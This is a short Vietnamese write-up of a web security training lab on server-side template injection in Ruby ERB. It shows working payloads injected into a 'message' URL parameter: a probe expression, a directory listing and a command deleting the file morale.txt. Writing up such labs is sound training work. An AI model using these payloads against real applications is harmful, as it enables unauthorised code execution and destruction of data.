## Các bước khai thác  
1. Read  
  - Template syntax  
  - Security documentation  
  - Documented exploits  
2. Explore the environment  
3. Create a custom attack  

## Overview  
Kiểm tra các input đầu vào, sử dụng các expression đơn giản để kiểm tra `<%= 7*7 %>`. Bài lab này bị lỗi tại đường link thông báo sản phẩm hết hàng
`web-security-academy.net/?message=Unfortunately this product is out of stock`.   

![image](https://user-images.githubusercontent.com/22276823/126865885-096788ac-bde2-4c14-bdea-959f119e705d.png)  

Sau khi đã xác định được lỗi, ta có thể dùng các modulecủa ruby để khai thác thông tin.  
`<%=+Dir.entries(".")+%>` liệt kê các file trong thư mục hiện tại    

![image](https://user-images.githubusercontent.com/22276823/126865915-e5c86b50-30ce-4912-9ef7-025100621293.png)  
  

`<%=+File.delete("morale.txt")+%>` Xóa file  
![image](https://user-images.githubusercontent.com/22276823/126865973-948a7cc8-cfb7-4dff-a1fe-36a7dd5d2cae.png)  



